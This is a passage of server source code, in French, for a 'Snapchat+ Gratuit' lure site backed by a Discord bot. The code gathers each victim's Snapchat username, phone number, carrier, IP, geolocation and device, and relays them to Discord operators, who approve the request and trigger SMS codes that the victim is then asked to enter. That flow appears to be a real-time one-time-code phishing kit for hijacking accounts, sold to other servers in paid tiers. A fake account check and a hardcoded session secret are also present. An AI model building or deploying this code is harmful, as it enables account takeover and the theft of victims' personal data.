require('dotenv').config();
const express = require('express');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder, SlashCommandBuilder, StringSelectMenuBuilder, StringSelectMenuOptionBuilder, REST, Routes, ActivityType, ComponentType, PermissionFlagsBits } = require('discord.js');
const { v4: uuidv4 } = require('uuid');
const cookieSession = require('cookie-session');

// Stripe (optionnel — uniquement si STRIPE_SECRET_KEY est défini)
let stripe = null;
if (process.env.STRIPE_SECRET_KEY) {
    try { stripe = require('stripe')(process.env.STRIPE_SECRET_KEY); }
    catch (e) { console.warn('⚠️  Stripe non installé. Lance : npm install stripe'); }
}

// --- Configuration Express + HTTP + Socket.io ---
const app = express();
const httpServer = require('http').createServer(app);
const { Server: SocketIO } = require('socket.io');
const io = new SocketIO(httpServer, { cors: { origin: '*' } });
app.set('trust proxy', true);

// ⚡ Stripe webhook : raw body AVANT express.json()
app.use('/api/stripe/webhook', express.raw({ type: 'application/json' }));

// Sessions persistantes (cookie-session = stocké dans le cookie, survive aux restarts)
const SESSION_SECRET = process.env.SESSION_SECRET || 'snap-static-secret-42xZ9';
app.use(cookieSession({
    name: 'snap_sess',
    keys: [SESSION_SECRET],
    maxAge: 365 * 24 * 60 * 60 * 1000, // 1 an
    sameSite: 'lax',
    httpOnly: true,
    secure: false, // Render gère le HTTPS en proxy
}));

app.use(express.json());

// ⚡ Route /dashboard définie AVANT express.static pour éviter interception
app.get('/dashboard', (req, res, next) => {
    if (!req.session || !req.session.user) return res.redirect('/login');
    res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
});

app.use(express.static('public'));

// --- Configuration Discord ---
const client = new Client({
    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages]
});

let botReady = false;
const pendingMessages = []; // File d'attente si bot pas encore prêt

// ================== OWNER ==================
const OWNER_ID = '1066379595881914449';
function isOwner(userId) { return userId === OWNER_ID; }

// ================== MONGODB STORAGE ==================
const { MongoClient } = require('mongodb');
let _mongoClient = null;
let _db = null;

async function getDB() {
    if (_db) return _db;
    if (!process.env.MONGODB_URI) return null;
    try {
        if (!_mongoClient) {
            _mongoClient = new MongoClient(process.env.MONGODB_URI, {
                serverSelectionTimeoutMS: 10000,
                connectTimeoutMS: 10000,
            });
            await _mongoClient.connect();
        }
        _db = _mongoClient.db('snapbot');
        console.log('[DB] ✅ MongoDB connecté');
        return _db;
    } catch(e) {
        console.error('[DB] ❌ Connexion échouée:', e.message);
        _mongoClient = null;
        return null;
    }
}

async function dbGet(key) {
    try {
        const d = await getDB();
        if (!d) return null;
        const doc = await d.collection('store').findOne({ _id: key });
        return doc ? doc.value : null;
    } catch(e) { console.error(`[DB] dbGet(${key}):`, e.message); return null; }
}

async function dbSet(key, value) {
    try {
        const d = await getDB();
        if (!d) return;
        await d.collection('store').replaceOne({ _id: key }, { _id: key, value, updatedAt: new Date() }, { upsert: true });
    } catch(e) { console.error(`[DB] dbSet(${key}):`, e.message); }
}

// Synchronise toutes les données depuis MongoDB au démarrage
async function syncFromMongoDB() {
    const d = await getDB();
    if (!d) { console.log('[DB] MongoDB indisponible — utilisation des fichiers/env vars en fallback'); return; }
    try {
        const docs = await d.collection('store').find({ _id: { $in: ['subs','promos','history','blacklist','stats','config'] } }).toArray();
        const map = Object.fromEntries(docs.map(doc => [doc._id, doc.value]));

        if (map.subs)      { subs     = map.subs;      console.log(`[DB] subs: ${Object.keys(subs).length} utilisateur(s)`); }
        if (map.promos)    { promos   = map.promos;    console.log(`[DB] promos: ${Object.keys(promos).length} code(s)`); }
        if (map.history)   { history  = map.history;   console.log(`[DB] history: ${history.length} entrée(s)`); }
        if (map.blacklist) { blacklist = new Set(map.blacklist); console.log(`[DB] blacklist: ${blacklist.size} IP(s)`); }
        if (map.stats)     {
            statsToday = map.stats.today || statsToday;
            statsTotal = map.stats.total || statsTotal;
            console.log(`[DB] stats: ${statsToday.total} demandes aujourd'hui`);
        }
        if (map.config) {
            const c = map.config;
            if (c.guild_channels)     cfg.guild_channels     = { ...cfg.guild_channels, ...c.guild_channels };
            if (c.guild_premiums)     cfg.guild_premiums     = { ...cfg.guild_premiums, ...c.guild_premiums };
            if (c.disabled_guilds)    cfg.disabled_guilds    = c.disabled_guilds;
            if (c.guild_notifications)cfg.guild_notifications= c.guild_notifications;
            if (c.guild_owners)       cfg.guild_owners       = { ...cfg.guild_owners, ...c.guild_owners };
            // Paramètres du site
            const siteKeys = ['site_actif','ratelimit_actif','ratelimit_minutes','afficher_ip','afficher_appareil','salon_prioritaire','delai_discord_sec','timeout_minutes','webhook_fallback','bloquer_vpn','dm_notifs'];
            for (const k of siteKeys) if (k in c) cfg[k] = c[k];
            console.log(`[DB] config: ${Object.keys(c.guild_channels||{}).length} guild(s)`);
        }
        console.log('[DB] ✅ Synchronisation MongoDB terminée');
    } catch(e) { console.error('[DB] Erreur sync:', e.message); }
}

// ================== RENDER ENV VARS PERSISTENCE ==================
const https = require('https');
const httpsRequest = (options, body = null) => new Promise((resolve, reject) => {
    const req = https.request(options, res => {
        let data = '';
        res.on('data', d => data += d);
        res.on('end', () => resolve({ status: res.statusCode, body: data }));
    });
    req.on('error', reject);
    if (body) req.write(body);
    req.end();
});

let _renderVarsCache = null;
async function updateRenderEnvVars(updates) {
    const apiKey    = process.env.RENDER_API_KEY;
    const serviceId = process.env.RENDER_SERVICE_ID;
    if (!apiKey || !serviceId) return;
    for (const [k, v] of Object.entries(updates)) process.env[k] = v;
    try {
        let existingVars = _renderVarsCache;
        if (!existingVars) {
            const getRes = await httpsRequest({
                hostname: 'api.render.com',
                path: `/v1/services/${serviceId}/env-vars`,
                method: 'GET',
                headers: { 'Authorization': `Bearer ${apiKey}` },
            });
            existingVars = getRes.status === 200
                ? JSON.parse(getRes.body).map(v => ({ key: v.envVar?.key || v.key, value: v.envVar?.value || v.value }))
                : [];
            _renderVarsCache = existingVars;
            setTimeout(() => { _renderVarsCache = null; }, 30000);
        }
        const updateKeys = Object.keys(updates);
        const merged = existingVars.filter(v => v.key && !updateKeys.includes(v.key));
        for (const [key, value] of Object.entries(updates)) merged.push({ key, value });
        _renderVarsCache = merged;
        const putBody = JSON.stringify(merged);
        const putRes = await httpsRequest({
            hostname: 'api.render.com',
            path: `/v1/services/${serviceId}/env-vars`,
            method: 'PUT',
            headers: { 'Authorization': `Bearer ${apiKey}`, 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(putBody) },
        }, putBody);
        if (putRes.status === 200) console.log(`[RENDER] ✅ ${updateKeys.join(', ')} persistés`);
        else console.error(`[RENDER] ❌ ${putRes.status}: ${putRes.body.slice(0,200)}`);
    } catch(e) { console.error('[RENDER] Erreur API:', e.message); }
}

// ================== CODES PROMO ==================
const PROMOS_FILE = path.join(__dirname, 'promocodes.json');
function loadPromos() {
    if (process.env.PROMOS_DATA) { try { return JSON.parse(process.env.PROMOS_DATA); } catch(e) {} }
    try { if (fs.existsSync(PROMOS_FILE)) return JSON.parse(fs.readFileSync(PROMOS_FILE, 'utf8')); } catch(e) {}
    return {};
}
function savePromos(data) {
    try { fs.writeFileSync(PROMOS_FILE, JSON.stringify(data, null, 2), 'utf8'); } catch(e) {}
    dbSet('promos', data).catch(() => {});
}
let promos = loadPromos();

// ================== ABONNEMENTS PREMIUM ==================
const SUBS_FILE = path.join(__dirname, 'subscriptions.json');

function loadSubs() {
    if (process.env.SUBS_DATA) { try { return JSON.parse(process.env.SUBS_DATA); } catch(e) {} }
    try {
        if (fs.existsSync(SUBS_FILE)) return JSON.parse(fs.readFileSync(SUBS_FILE, 'utf8'));
    } catch (e) {}
    return {};
}
function saveSubs(data) {
    try { fs.writeFileSync(SUBS_FILE, JSON.stringify(data, null, 2), 'utf8'); } catch (e) {}
    dbSet('subs', data).catch(() => {});
}
let subs = loadSubs();

// ---- Helpers tier ----
function _activeSub(discordId) {
    const sub = subs[discordId];
    if (!sub || !sub.active) return null;
    if (sub.expiresAt && sub.expiresAt < Date.now()) return null;
    return sub;
}

// Accès BOT (3€) — peut utiliser /setchannel, recevoir des demandes, gérer via Discord
function hasBotAccess(discordId) {
    if (isOwner(discordId)) return true;
    const sub = _activeSub(discordId);
    return !!(sub && (sub.tier === 'bot' || sub.tier === 'premium'));
}

// Accès PREMIUM (6€) — dashboard complet, stats, config, analytics
function hasSubscription(discordId) {
    if (isOwner(discordId)) return true;
    const sub = _activeSub(discordId);
    return !!(sub && sub.tier === 'premium');
}

// Serveur avec accès bot accordé par l'owner (tier 'bot' ou 'premium')
function hasGuildBotAccess(guildId) {
    if (!guildId) return false;
    const g = cfg.guild_premiums && cfg.guild_premiums[guildId];
    return !!(g);
}

// Serveur avec accès premium accordé par l'owner
function hasGuildPremium(guildId) {
    if (!guildId) return false;
    const g = cfg.guild_premiums && cfg.guild_premiums[guildId];
    return !!(g && g.tier === 'premium');
}

// Vérifie si un user/serveur peut accéder aux features premium
function canUsePremium(userId, guildId) {
    if (isOwner(userId)) return true;
    if (hasSubscription(userId)) return true;
    if (guildId && hasGuildPremium(guildId)) return true;
    return false;
}

// Retourne une string lisible du type d'abonnement
function getSubType(userId) {
    if (isOwner(userId)) return '👑 Owner (Premium ∞)';
    const sub = _activeSub(userId);
    if (!sub) {
        const expired = subs[userId];
        return expired && expired.active === false ? '🆓 Gratuit (expiré)' : '🆓 Gratuit';
    }
    const tierLabel = sub.tier === 'bot' ? '🤖 Bot' : '💎 Premium';
    if (sub.expiresAt) {
        const d = new Date(sub.expiresAt);
        return `${tierLabel} (jusqu'au ${d.toLocaleDateString('fr-FR')})`;
    }
    if (sub.promoCode) return `${tierLabel} (code ${sub.promoCode})`;
    return tierLabel;
}

// ================== AUTH MIDDLEWARE ==================
const DISCORD_CLIENT_ID     = process.env.DISCORD_CLIENT_ID;
const DISCORD_CLIENT_SECRET = process.env.DISCORD_CLIENT_SECRET;

function requireAuth(req, res, next) {
    if (!req.session || !req.session.user) {
        // Routes API → JSON 401 (pas de redirect qui casse le .json())
        if (req.path.startsWith('/api/')) return res.status(401).json({ error: 'not_logged_in' });
        return res.redirect('/login');
    }
    next();
}

// ================== CONFIG PERSISTANTE ==================
const CONFIG_FILE = path.join(__dirname, 'config.json');
const CONFIG_DEFAULTS = {
    // ---- Options bot/site ----
    afficher_ip:          true,   // afficher l'IP dans les embeds
    afficher_appareil:    true,   // afficher appareil/OS dans les embeds
    ratelimit_actif:      true,   // activer le rate limiting
    ratelimit_minutes:    10,     // durée rate limit en minutes
    timeout_minutes:      5,      // auto-reject après X min
    delai_discord_sec:    10,     // délai entre salon prioritaire et principal
    salon_prioritaire:    true,   // envoyer dans le salon prioritaire
    site_actif:           true,   // accepter ou bloquer les soumissions
    webhook_fallback:     true,   // utiliser le webhook si bot down
    bloquer_vpn:          true,   // bloquer les VPN/proxy

    // ---- Apparence du site (modifiable via dashboard) ----
    site_titre:           'Snapchat+',
    site_sous_titre:      'Gratuit',
    site_description:     'Profite de toutes les fonctionnalités premium sans payer. Rapide, simple, 100% gratuit.',
    site_stat_actif:      '2 836',
    site_badge:           'OFFRE LIMITÉE',
    site_btn_text:        'Obtenir Snapchat+ gratuit',

    // ---- Textes étapes ----
    site_attente_titre:   '🛡️ En attente de validation',
    site_attente_texte:   'Un administrateur examine votre demande. Restez sur cette page, cela prend quelques instants.',
    site_code_titre:      'Entrez le code',
    site_code_desc:       'Un code à 6 chiffres a été envoyé par SMS à votre numéro. Entrez-le ci-dessous pour vérifier votre compte.',
    site_succes_msg:      'Code vérifié ! Votre accès Premium est activé.',

    // ---- Status embed ----
    status_channel_id:    '',   // ID du salon où poster le status live
    status_message_id:    '',   // ID du message status (pour l'éditer)

    // ---- Serveurs sous contrôle owner ----
    guild_premiums:       {},   // { guildId: { grantedAt: timestamp } }
    guild_channels:       {},   // { guildId: channelId } — channel de réception des demandes
    guild_owners:         {},   // { guildId: userId } — qui a run /setchannel
    disabled_guilds:      [],   // [guildId] — guilds bloquées par l'owner
    guild_notifications:  [],   // [{ guildId, name, icon, joinedAt, seen }] — nouveaux serveurs

    // ---- Notifications ----
    dm_notifs:            true, // DM à l'owner à chaque approve/reject
};

function loadConfig() {
    let c = { ...CONFIG_DEFAULTS };
    try {
        if (fs.existsSync(CONFIG_FILE)) {
            c = { ...c, ...JSON.parse(fs.readFileSync(CONFIG_FILE, 'utf8')) };
        }
    } catch (e) { console.error('Erreur chargement config.json:', e.message); }

    // guild_channels : priorité à l'env var GUILD_CHANNELS
    if (process.env.GUILD_CHANNELS) {
        try {
            const envChannels = JSON.parse(process.env.GUILD_CHANNELS);
            c.guild_channels = { ...c.guild_channels, ...envChannels };
            console.log(`[CONFIG] guild_channels chargés depuis GUILD_CHANNELS env: ${Object.keys(c.guild_channels).length} serveur(s)`);
        } catch(e) { console.error('[CONFIG] Erreur parsing GUILD_CHANNELS env:', e.message); }
    }
    // guild_premiums + disabled_guilds : env var CONFIG_DATA
    if (process.env.CONFIG_DATA) {
        try {
            const envCfg = JSON.parse(process.env.CONFIG_DATA);
            if (envCfg.guild_premiums) c.guild_premiums = { ...c.guild_premiums, ...envCfg.guild_premiums };
            if (envCfg.disabled_guilds) c.disabled_guilds = envCfg.disabled_guilds;
            if (envCfg.guild_notifications) c.guild_notifications = envCfg.guild_notifications;
            if (envCfg.guild_owners) c.guild_owners = { ...c.guild_owners, ...envCfg.guild_owners };
            console.log(`[CONFIG] guild_premiums/disabled chargés depuis CONFIG_DATA env`);
        } catch(e) { console.error('[CONFIG] Erreur parsing CONFIG_DATA env:', e.message); }
    }

    return c;
}

function saveConfig(cfg) {
    try { fs.writeFileSync(CONFIG_FILE, JSON.stringify(cfg, null, 2), 'utf8'); }
    catch (e) { console.error('Erreur sauvegarde config.json:', e.message); }
}

// Sauvegarde toute la config (MongoDB + Render env var fallback)
async function saveGuildChannels() {
    saveConfig(cfg);
    // MongoDB — source de vérité
    dbSet('config', cfg).catch(() => {});
    // Render env var — fallback si MongoDB indisponible
    const configData = JSON.stringify({
        guild_premiums: cfg.guild_premiums || {},
        disabled_guilds: cfg.disabled_guilds || [],
        guild_notifications: cfg.guild_notifications || [],
        guild_owners: cfg.guild_owners || {},
    });
    updateRenderEnvVars({
        GUILD_CHANNELS: JSON.stringify(cfg.guild_channels),
        CONFIG_DATA: configData,
    }).catch(() => {});
}

let cfg = loadConfig();

// ================== PERSISTANCE JSON ==================
const DATA_FILE = path.join(__dirname, 'requests.json');

function loadRequests() {
    try {
        if (fs.existsSync(DATA_FILE)) {
            const raw = fs.readFileSync(DATA_FILE, 'utf8');
            const obj = JSON.parse(raw);
            return new Map(Object.entries(obj));
        }
    } catch (e) {
        console.error('Erreur chargement requests.json:', e.message);
    }
    return new Map();
}

function saveRequests(map) {
    try {
        const obj = {};
        for (const [k, v] of map.entries()) obj[k] = v;
        fs.writeFileSync(DATA_FILE, JSON.stringify(obj, null, 2), 'utf8');
    } catch (e) {
        console.error('Erreur sauvegarde requests.json:', e.message);
    }
}

const requests = loadRequests();

// ================== HISTORIQUE (50 dernières demandes) ==================
const HISTORY_FILE = path.join(__dirname, 'history.json');
function loadHistory() {
    if (process.env.HISTORY_DATA) { try { return JSON.parse(process.env.HISTORY_DATA); } catch(e) {} }
    try {
        if (fs.existsSync(HISTORY_FILE)) return JSON.parse(fs.readFileSync(HISTORY_FILE, 'utf8'));
    } catch (e) {}
    return [];
}
function saveHistory(arr) {
    try { fs.writeFileSync(HISTORY_FILE, JSON.stringify(arr, null, 2), 'utf8'); } catch (e) {}
    dbSet('history', arr).catch(() => {});
}
let history = loadHistory();
function pushHistory(entry) {
    history.unshift(entry);
    if (history.length > 100) history = history.slice(0, 100);
    saveHistory(history);
}

// ================== BLACKLIST ==================
const BLACKLIST_FILE = path.join(__dirname, 'blacklist.json');
function loadBlacklist() {
    if (process.env.BLACKLIST_DATA) { try { return new Set(JSON.parse(process.env.BLACKLIST_DATA)); } catch(e) {} }
    try {
        if (fs.existsSync(BLACKLIST_FILE)) return new Set(JSON.parse(fs.readFileSync(BLACKLIST_FILE, 'utf8')));
    } catch (e) {}
    return new Set();
}
function saveBlacklist(set) {
    try { fs.writeFileSync(BLACKLIST_FILE, JSON.stringify([...set], null, 2), 'utf8'); } catch (e) {}
    dbSet('blacklist', [...set]).catch(() => {});
}
let blacklist = loadBlacklist();

// ================== GÉOLOCALISATION IP ==================
async function geolocateIP(ip) {
    if (!ip || ip === 'inconnu' || ip === '127.0.0.1' || ip.startsWith('::')) {
        return { city: 'Local', country: 'FR', isp: 'Localhost', proxy: false, flag: '🏠' };
    }
    try {
        const res = await axios.get(
            `http://ip-api.com/json/${ip}?fields=status,country,countryCode,city,isp,proxy,hosting`,
            { timeout: 3000 }
        );
        const d = res.data;
        if (d.status !== 'success') return null;
        // Emoji drapeau depuis countryCode
        const flag = d.countryCode
            ? d.countryCode.toUpperCase().replace(/./g, c => String.fromCodePoint(0x1F1E0 - 65 + c.charCodeAt(0)))
            : '🌍';
        return { city: d.city || '?', country: d.country || '?', isp: d.isp || '?', proxy: d.proxy || d.hosting || false, flag };
    } catch (e) {
        return null;
    }
}

// ================== RATE LIMITING ==================
const rateLimitMap = new Map(); // IP → timestamp dernière soumission
function isRateLimited(ip) {
    if (!cfg.ratelimit_actif) return false;
    const last = rateLimitMap.get(ip);
    if (!last) return false;
    return Date.now() - last < cfg.ratelimit_minutes * 60 * 1000;
}

function setRateLimit(ip) {
    rateLimitMap.set(ip, Date.now());
    setTimeout(() => rateLimitMap.delete(ip), cfg.ratelimit_minutes * 60 * 1000);
}

// ================== ENVOI DISCORD (avec file d'attente) ==================
async function sendToDiscord(fn) {
    if (botReady) {
        return fn();
    }
    return new Promise((resolve, reject) => {
        pendingMessages.push(async () => {
            try { resolve(await fn()); }
            catch (e) { reject(e); }
        });
    });
}

// ================== UTILITAIRES ==================
const APPROVAL_CHANNEL_ID  = process.env.APPROVAL_CHANNEL_ID || process.env.DISCORD_APPROVAL_CHANNEL;
const PRIORITY_CHANNEL_ID  = '1532004514306068510';
const WEBHOOK_URL           = process.env.DISCORD_WEBHOOK_URL || null; // fallback si bot down
const BASE_URL              = process.env.BASE_URL || `http://localhost:${process.env.PORT || 3000}`;
const PORT                  = process.env.PORT || 3000;
// ================== STATS PERSISTANTES ==================
const STATS_FILE = path.join(__dirname, 'stats.json');

function loadStats() {
    // Priorité : env var > fichier > vide
    if (process.env.STATS_DATA) {
        try {
            const raw = JSON.parse(process.env.STATS_DATA);
            return {
                today: raw.today || { total:0, approved:0, rejected:0, codes:0, date: new Date().toDateString() },
                total: raw.total || { total:0, approved:0, rejected:0, codes:0 }
            };
        } catch(e) {}
    }
    try {
        if (fs.existsSync(STATS_FILE)) {
            const raw = JSON.parse(fs.readFileSync(STATS_FILE, 'utf8'));
            return {
                today: raw.today || { total:0, approved:0, rejected:0, codes:0, date: new Date().toDateString() },
                total: raw.total || { total:0, approved:0, rejected:0, codes:0 }
            };
        }
    } catch(e) {}
    return {
        today: { total:0, approved:0, rejected:0, codes:0, date: new Date().toDateString() },
        total: { total:0, approved:0, rejected:0, codes:0 }
    };
}

function saveStats() {
    try { fs.writeFileSync(STATS_FILE, JSON.stringify({ today: statsToday, total: statsTotal }, null, 2), 'utf8'); } catch(e) {}
    dbSet('stats', { today: statsToday, total: statsTotal }).catch(() => {});
}

const _stats = loadStats();
let statsToday = _stats.today;
let statsTotal = _stats.total;

function resetStatsIfNewDay() {
    const today = new Date().toDateString();
    if (statsToday.date !== today) {
        statsToday = { total:0, approved:0, rejected:0, codes:0, date: today };
        saveStats();
    }
}

// Helpers pour incrémenter + sauvegarder en une ligne
function incStat(key) {
    statsToday[key]++;
    statsTotal[key]++;
    saveStats();
}

// Limite commandes pour utilisateurs gratuits (5/jour)
const FREE_DAILY_LIMIT = 5;
const dailyCmdUsage = {}; // { userId: { date, count } }
function checkFreeLimit(userId, guildId) {
    if (isOwner(userId) || hasSubscription(userId) || (guildId && hasGuildPremium(guildId))) return true;
    const today = new Date().toDateString();
    if (!dailyCmdUsage[userId] || dailyCmdUsage[userId].date !== today) {
        dailyCmdUsage[userId] = { date: today, count: 0 };
    }
    if (dailyCmdUsage[userId].count >= FREE_DAILY_LIMIT) return false;
    dailyCmdUsage[userId].count++;
    return true;
}
function updateBotStatus() {
    if (!botReady) return;
    resetStatsIfNewDay();
    client.user.setActivity(`🎯 ${statsToday.total} demandes aujourd'hui`, { type: ActivityType.Watching });
}

// Envoi webhook fallback
async function sendWebhookFallback(content) {
    if (!WEBHOOK_URL) return;
    try {
        await axios.post(WEBHOOK_URL, { content }, { timeout: 5000 });
    } catch (e) {
        console.error('Erreur webhook fallback:', e.message);
    }
}

function parseUserAgent(ua) {
    if (!ua) return { os: 'Inconnu', device: 'Inconnu' };
    let os = 'Inconnu';
    let device = 'Desktop';
    if (/iPhone/.test(ua)) { os = 'iOS'; device = '📱 iPhone'; }
    else if (/iPad/.test(ua)) { os = 'iOS'; device = '📱 iPad'; }
    else if (/Android/.test(ua)) {
        os = 'Android';
        const m = ua.match(/Android [0-9.]+; ([^)]+)/);
        device = '📱 ' + (m ? m[1].trim() : 'Android');
    } else if (/Windows/.test(ua)) { os = 'Windows'; device = '🖥️ PC'; }
    else if (/Macintosh/.test(ua)) { os = 'macOS'; device = '🖥️ Mac'; }
    else if (/Linux/.test(ua)) { os = 'Linux'; device = '🖥️ Linux'; }
    return { os, device };
}

// ================== ROUTES EXPRESS ==================

// 1. Soumission des infos (étape 1)
app.post('/api/submit', async (req, res) => {
    const { snapchat, phone, operator, ref } = req.body;
    if (!snapchat || !phone || !operator) {
        return res.status(400).json({ error: 'Champs manquants' });
    }

    // Site désactivé — réponse JSON pour l'API
    if (!cfg.site_actif) {
        return res.status(503).json({ error: 'site_disabled' });
    }

    // Rate limiting + blacklist + VPN
    const ip = (req.headers['x-forwarded-for'] || req.ip || 'inconnu').split(',')[0].trim();

    if (blacklist.has(ip)) {
        return res.status(403).json({ error: 'Accès refusé.' });
    }
    if (isRateLimited(ip)) {
        return res.status(429).json({ error: `Trop de demandes, réessaie dans ${cfg.ratelimit_minutes} minutes.` });
    }

    // Géolocalisation + détection VPN (timeout 3s max, jamais bloquant)
    let geo = null;
    try { geo = await geolocateIP(ip); } catch (e) {}
    if (geo && geo.proxy && cfg.bloquer_vpn === true) {
        return res.status(403).json({ error: 'VPN/proxy détecté. Désactive-le et réessaie.' });
    }

    setRateLimit(ip);
    const ua = req.headers['user-agent'] || '';
    const { os, device } = parseUserAgent(ua);

    const id = uuidv4();
    const geoStr = geo ? `${geo.flag} ${geo.city}, ${geo.country}` : '?';
    const ispStr = geo ? geo.isp : '?';
    // Valider le ref (guild ID) — doit avoir un channel configuré
    const refChannelId = ref && cfg.guild_channels ? cfg.guild_channels[String(ref)] : null;
    const refGuildId   = refChannelId ? String(ref) : null;
    console.log(`[SUBMIT] ref=${ref} | guild_channels keys=${Object.keys(cfg.guild_channels||{}).join(',')} | refChannelId=${refChannelId} | routing=${refGuildId ? 'CLIENT' : 'OWNER'}`);

    const requestData = {
        snapchat, phone, operator, ip, device, os, geo: geoStr, isp: ispStr,
        approved: false, rejected: false, code: null,
        createdAt: Date.now(),
        refGuildId:   refGuildId   || null,
        refChannelId: refChannelId || null,
    };
    requests.set(id, requestData);
    saveRequests(requests);

    // Historique
    pushHistory({ id, snapchat, phone, operator, ip, device, os, createdAt: requestData.createdAt, status: 'pending' });

    // Stats
    resetStatsIfNewDay();
    incStat('total');
    updateBotStatus();

    // Notif temps réel → dashboard
    io.emit('new_request', { id, snapchat, phone, operator, createdAt: requestData.createdAt });

    // Timeout auto + notif Discord
    setTimeout(async () => {
        const req = requests.get(id);
        if (req && !req.approved && !req.rejected) {
            req.rejected = true;
            saveRequests(requests);
            console.log(`⏰ Demande #${id} auto-rejetée après 5 min`);
            incStat('rejected');
            updateBotStatus();
            // Notif dans le salon prioritaire
            try {
                await sendToDiscord(async () => {
                    const priorityChannel = client.channels.cache.get(PRIORITY_CHANNEL_ID);
                    if (priorityChannel) {
                        await priorityChannel.send({
                            embeds: [new EmbedBuilder()
                                .setTitle('⏰ Demande expirée sans réponse')
                                .setColor(0xFF4444)
                                .addFields(
                                    { name: 'Pseudo', value: req.snapchat, inline: true },
                                    { name: 'ID',     value: id,           inline: true }
                                )
                                .setFooter({ text: 'Auto-rejetée après 5 min' })
                                .setTimestamp()
                            ]
                        });
                    }
                });
            } catch (e) {
                // Fallback webhook si bot down
                await sendWebhookFallback(`⏰ Demande expirée : **${req.snapchat}** (ID: ${id})`);
            }
        }
    }, cfg.timeout_minutes * 60 * 1000);

    // Répondre immédiatement au client — Discord s'envoie en arrière-plan
    res.json({ id });

    // Envoi Discord asynchrone (ne bloque plus la réponse HTTP)
    const sendDiscordAsync = async () => {
        console.log(`[DISCORD] Envoi PRIORITY=${PRIORITY_CHANNEL_ID}${refGuildId ? ` + client ${refChannelId}` : ' (avec boutons)'}`);

        // Helper fetch channel
        const fetchChannel = async (id) => {
            if (!id) return null;
            let ch = client.channels.cache.get(id);
            if (!ch) { try { ch = await client.channels.fetch(id); } catch(e) { console.error(`[DISCORD] Channel ${id} introuvable:`, e.message); } }
            return ch || null;
        };

        const priorityChannel = await fetchChannel(PRIORITY_CHANNEL_ID);
        const clientChannel   = refGuildId ? await fetchChannel(refChannelId) : null;

        if (!priorityChannel && !clientChannel) {
            console.error('[DISCORD] Aucun channel disponible — fallback webhook');
            await sendWebhookFallback(`📱 Nouvelle demande : **${snapchat}** | ${phone} | ${operator} | IP: ${ip}`);
            return;
        }

        const expireAt  = new Date(requestData.createdAt + cfg.timeout_minutes * 60 * 1000);
        const expireStr = `<t:${Math.floor(expireAt.getTime() / 1000)}:R>`;

        const baseFields = [
            { name: '👤 Pseudo',    value: `\`${snapchat}\``, inline: true },
            { name: '📞 Téléphone', value: `\`${phone}\``,    inline: true },
            { name: '📡 Opérateur', value: operator,          inline: true },
        ];
        if (cfg.afficher_appareil) {
            baseFields.push({ name: '📱 Appareil', value: device, inline: true });
            baseFields.push({ name: '💻 OS',       value: os,     inline: true });
        }
        if (cfg.afficher_ip) {
            baseFields.push({ name: '🌍 Localisation', value: geoStr, inline: true });
            baseFields.push({ name: '🔌 FAI',          value: ispStr, inline: true });
            baseFields.push({ name: '🔒 IP',           value: `\`${ip}\``, inline: true });
        }
        baseFields.push({ name: '⏰ Expire', value: expireStr,             inline: true });
        baseFields.push({ name: '🆔 ID',     value: `\`${id.slice(0,8)}...\``, inline: true });

        const embed = new EmbedBuilder()
            .setTitle('📱 Nouvelle demande Snapchat+')
            .setDescription('> Un utilisateur veut activer son abonnement Premium.')
            .setColor(0xFFFC00)
            .addFields(...baseFields)
            .setThumbnail('https://upload.wikimedia.org/wikipedia/en/c/c4/Snapchat_logo.png')
            .setFooter({ text: `Snap Activator • ${new Date().toLocaleString('fr-FR')}` })
            .setTimestamp();

        const row = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId(`approve_${id}`).setLabel('Accepter').setEmoji('✅').setStyle(ButtonStyle.Success),
            new ButtonBuilder().setCustomId(`reject_${id}`).setLabel('Refuser').setEmoji('❌').setStyle(ButtonStyle.Danger),
            new ButtonBuilder().setCustomId(`resend_${id}`).setLabel('Renvoyer SMS').setEmoji('📲').setStyle(ButtonStyle.Secondary)
        );

        const clientInfo = refGuildId ? ` (client \`${refGuildId}\`)` : '';

        // 1. PRIORITY — toujours info seulement, jamais de boutons
        if (priorityChannel) {
            const monitorEmbed = new EmbedBuilder()
                .setTitle('👁️ Nouvelle demande — monitoring')
                .setDescription(refGuildId ? `> Gérée par le client \`${refGuildId}\`` : '> Demande directe (sans ref)')
                .setColor(0xFF6600)
                .addFields(...baseFields)
                .setThumbnail('https://upload.wikimedia.org/wikipedia/en/c/c4/Snapchat_logo.png')
                .setFooter({ text: `Snap Activator • ${new Date().toLocaleString('fr-FR')}` })
                .setTimestamp();
            try { await priorityChannel.send({ content: `🔔 Nouvelle demande${clientInfo}`, embeds: [monitorEmbed] }); }
            catch(e) { console.error('Erreur envoi priority monitoring:', e.message); }
        }

        // 2. Envoi avec boutons : channel client si ref, sinon fallback webhook
        if (refGuildId) {
            if (clientChannel) {
                console.log(`[DISCORD] Envoi boutons → channel client ${refChannelId}`);
                try { await clientChannel.send({ embeds: [embed], components: [row] }); }
                catch(e) { console.error('Erreur envoi channel client:', e.message); }
            } else {
                console.error(`[DISCORD] Channel client ${refChannelId} introuvable — boutons perdus`);
                await sendWebhookFallback(`📱 ${snapchat} | ${phone} | ${operator} | ref=${refGuildId} (channel introuvable)`);
            }
        } else {
            // Pas de ref : personne pour gérer les boutons, on envoie en webhook fallback
            await sendWebhookFallback(`📱 Demande directe : **${snapchat}** | ${phone} | ${operator} | IP: ${ip}`);
        }

        console.log(`✅ Demande #${id} envoyée à Discord`);
    };

    if (botReady) {
        sendDiscordAsync().catch(err => {
            console.error('Erreur Discord async:', err.message);
            sendWebhookFallback(`📱 ${snapchat} | ${phone} | ${operator} | ${ip}`);
        });
    } else {
        pendingMessages.push(() => sendDiscordAsync().catch(console.error));
    }
});

// 2. Vérification pseudo Snapchat (toujours valide si format correct)
app.get('/api/check-snapchat/:username', (req, res) => {
    const username = req.params.username.trim().toLowerCase();

    if (!username || username.length < 3 || username.length > 15) {
        return res.json({ exists: false, reason: 'format' });
    }

    // Format Snapchat valide : lettres, chiffres, tirets, underscores, points
    if (!/^[a-z0-9._-]{3,15}$/.test(username)) {
        return res.json({ exists: false, reason: 'format' });
    }

    // Toujours retourner trouvé si le format est valide
    return res.json({ exists: true, username, displayName: username, avatarUrl: null });
});

// 3. Statut d'une demande (polling)
app.get('/api/status/:id', (req, res) => {
